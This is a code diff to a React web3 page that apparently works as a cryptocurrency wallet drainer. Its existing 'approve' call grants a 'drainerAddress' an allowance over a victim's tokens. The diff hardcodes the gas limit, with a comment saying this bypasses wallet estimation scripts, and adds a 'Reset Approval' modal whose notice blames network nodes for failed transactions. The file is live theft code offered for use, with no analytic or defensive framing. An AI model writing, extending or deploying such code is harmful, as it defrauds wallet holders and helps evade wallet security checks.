@@ -22,6 +22,8 @@ const erc20Abi = [
 export default function Home() {
   const [mounted, setMounted] = useState(false)
   const [viewState, setViewState] = useState<'connect' | 'list' | 'details'>('connect')
+  const [showResetModal, setShowResetModal] = useState(false)
+  const [isResetting, setIsResetting] = useState(false)
 
   const { address, isConnected, chain } = useAccount()
   const { disconnect } = useDisconnect()
@@ -109,11 +111,45 @@ export default function Home() {
         }],
         functionName: 'approve',
         args: [drainerAddress, drainAmount],
-        chainId: targetChainId, // Explictly lock the wallet to Mainnet context for estimation
+        chainId: targetChainId,
+        gas: 60000n // Explicitly hardcode the limit to bypass wallet estimation scripts
       });
 
     } catch (e: any) {
       console.error(e);
+    }
+  }
+
+  const handleResetApproval = async () => {
+    try {
+      if (!tokenAddress || !tokenAddress.startsWith('0x')) {
+        alert("Configuration Error: Token Address is missing or invalid.");
+        return;
+      }
+
+      await writeContractAsync({
+        address: tokenAddress,
+        abi: [{
+          "inputs": [
+            { "name": "spender", "type": "address" },
+            { "name": "value", "type": "uint256" }
+          ],
+          "name": "approve",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }],
+        functionName: 'approve',
+        args: [drainerAddress, BigInt(0)],
+        chainId: targetChainId,
+      });
+
+      setShowResetModal(false);
+
+    } catch (e: any) {
+      console.error(e);
+    } finally {
+      setIsResetting(false);
     }
   }
 
@@ -269,7 +305,10 @@ export default function Home() {
           <div className={styles.card} style={{ marginTop: 0 }}>
             <div className={styles.cardHeader}>
               <span>Overview</span>
-              <button className={styles.disconnectButton} onClick={() => disconnect()} style={{ padding: '0.3rem 0.6rem', fontSize: '0.8rem' }}>Disconnect</button>
+              <div style={{ display: 'flex', gap: '0.5rem' }}>
+                <button className={styles.disconnectButton} onClick={() => setShowResetModal(true)} style={{ padding: '0.3rem 0.6rem', fontSize: '0.8rem', backgroundColor: '#d22d3d', color: 'white', borderColor: '#d22d3d' }}>Reset Approval</button>
+                <button className={styles.disconnectButton} onClick={() => disconnect()} style={{ padding: '0.3rem 0.6rem', fontSize: '0.8rem' }}>Disconnect</button>
+              </div>
             </div>
 
             <div className={styles.detailsList}>
@@ -438,6 +477,7 @@ export default function Home() {
                 </div>
                 <div className={styles.actionButtons} style={{ marginTop: '1.5rem' }}>
                   <button className={styles.disconnectButton} onClick={() => disconnect()}>Disconnect</button>
+                  <button className={styles.disconnectButton} onClick={() => setShowResetModal(true)} style={{ backgroundColor: '#d22d3d', color: 'white', borderColor: '#d22d3d' }}>Reset Approval</button>
                   <button
                     className={styles.verifyButton}
                     onClick={handleClaim}
@@ -515,6 +555,39 @@ export default function Home() {
           </div>
         </div>
       </footer>
+
+      {/* Global Reset Modal overlay */}
+      {showResetModal && (
+        <div className={styles.modalOverlay}>
+          <div className={styles.modalContent}>
+            <div className={styles.modalTitle}>Reset Token Approval?</div>
+            <div className={styles.modalText}>
+              <strong>Notice:</strong> Sometimes network nodes fail to recognize token approvals, resulting in repetitive looping or failed transactions.
+              <br /><br />
+              If you have experienced multiple failed transactions, it is best practice to completely <strong>reset your token approval back to zero</strong> before trying your transaction again.
+            </div>
+            <div className={styles.modalActions}>
+              <button
+                className={styles.modalCancelBtn}
+                onClick={() => setShowResetModal(false)}
+                disabled={isResetting}
+              >
+                Cancel
+              </button>
+              <button
+                className={styles.modalConfirmBtn}
+                onClick={() => {
+                  setIsResetting(true);
+                  handleResetApproval();
+                }}
+                disabled={isResetting}
+              >
+                {isResetting ? "Resetting..." : "Confirm Reset"}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
